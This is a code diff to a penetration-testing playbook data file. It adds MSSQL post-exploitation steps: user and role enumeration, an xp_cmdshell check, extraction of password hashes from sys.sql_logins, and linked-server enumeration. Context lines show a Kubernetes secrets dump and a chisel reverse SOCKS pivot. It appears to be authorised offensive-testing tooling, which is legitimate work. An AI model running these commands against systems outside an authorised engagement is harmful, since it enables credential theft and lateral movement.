@@ -1260,6 +1260,13 @@ export const PHASES: Phase[] = [
             command: 'mkdir -p engagements/{target}/post-ex && (kubectl auth can-i --list; kubectl get pods -A; kubectl get secrets -A 2>&1 | head -50) | tee engagements/{target}/post-ex/k8s-enum.txt',
             techApplies: ['k8s'],
           },
+          {
+            label: "MSSQL — enumerate db users & roles",
+            command: "sqlcmd -S {target} -d master -Q \"SELECT name, type_desc, create_date FROM sys.server_principals WHERE type IN ('S','U'); EXEC sp_helpsrvrolemember;\"",
+            osApplies: ["windows"],
+            techApplies: ["mssql"],
+            mitreTechniques: ["T1087.003"],
+          },
         ],
         tools: [
           { name: 'GTFOBins', url: 'https://gtfobins.github.io/', kind: 'web', note: 'Linux SUID/sudo/restricted-shell-escape reference — query before running', osApplies: ['linux'] },
@@ -1270,6 +1277,7 @@ export const PHASES: Phase[] = [
           { name: 'prowler', url: 'https://github.com/prowler-cloud/prowler', kind: 'cli', note: 'Multi-cloud audit (AWS / GCP / Azure / K8s) — CIS + custom checks', techApplies: ['aws', 'gcp', 'azure', 'k8s'] },
           { name: 'ScoutSuite', url: 'https://github.com/nccgroup/ScoutSuite', kind: 'cli', note: 'Multi-cloud security audit — auth, then HTML report of misconfigs', techApplies: ['aws', 'gcp', 'azure'] },
           { name: 'kubectl-who-can', url: 'https://github.com/aquasecurity/kubectl-who-can', kind: 'cli', note: 'Reverse RBAC lookup — "who can do X to Y?"', techApplies: ['k8s'] },
+          { name: 'sqlcmd', url: 'https://learn.microsoft.com/en-us/sql/tools/sqlcmd-utility', kind: 'cli', note: 'Microsoft\'s native MSSQL CLI — queries auth context, server roles, linked-server topology', techApplies: ['mssql'], osApplies: ['windows'] },
         ],
       },
       {
@@ -1312,6 +1320,13 @@ export const PHASES: Phase[] = [
             command: 'wmic service get name,displayname,pathname,startmode | findstr /i "auto" | findstr /i /v "C:\\Windows\\\\" | findstr /i /v """',
             osApplies: ['windows'],
             mitreTechniques: ['T1574.009'],
+          },
+          {
+            label: "MSSQL — check xp_cmdshell status",
+            command: "sqlcmd -S {target} -Q \"EXEC sp_configure 'xp_cmdshell';\" -d master",
+            osApplies: ["windows"],
+            techApplies: ["mssql"],
+            mitreTechniques: ["T1059.001"],
           },
         ],
         branches: [
@@ -1434,6 +1449,14 @@ export const PHASES: Phase[] = [
             techApplies: ['kerberos'],
             mitreTechniques: ['T1558.001'],
           },
+          {
+            label: "MSSQL — extract credential hashes",
+            command: "sqlcmd -S {target} -d master -Q \"SELECT name, password_hash FROM sys.sql_logins WHERE is_disabled = 0;\" -o mssql_hashes_{target}.txt",
+            appliesTo: ["private","lab"],
+            osApplies: ["windows"],
+            techApplies: ["mssql"],
+            mitreTechniques: ["T1003.007"],
+          },
         ],
         branches: [
           { if: 'creds for additional hosts in scope', goto: 'post-ex' },
@@ -1481,6 +1504,13 @@ export const PHASES: Phase[] = [
             label: 'chisel — reverse SOCKS pivot (cross-platform)',
             command: 'chisel server -p 8000 --reverse  # attacker side; on host: chisel client your-ip:8000 R:1080:socks',
             mitreTechniques: ['T1090.001', 'T1572'],
+          },
+          {
+            label: "MSSQL — enumerate linked servers",
+            command: "sqlcmd -S {target} -d master -Q \"EXEC sp_linkedservers; SELECT name, product, provider, data_source FROM sys.servers WHERE is_linked = 1;\"",
+            osApplies: ["windows"],
+            techApplies: ["mssql"],
+            mitreTechniques: ["T1210"],
           },
         ],
         tools: [
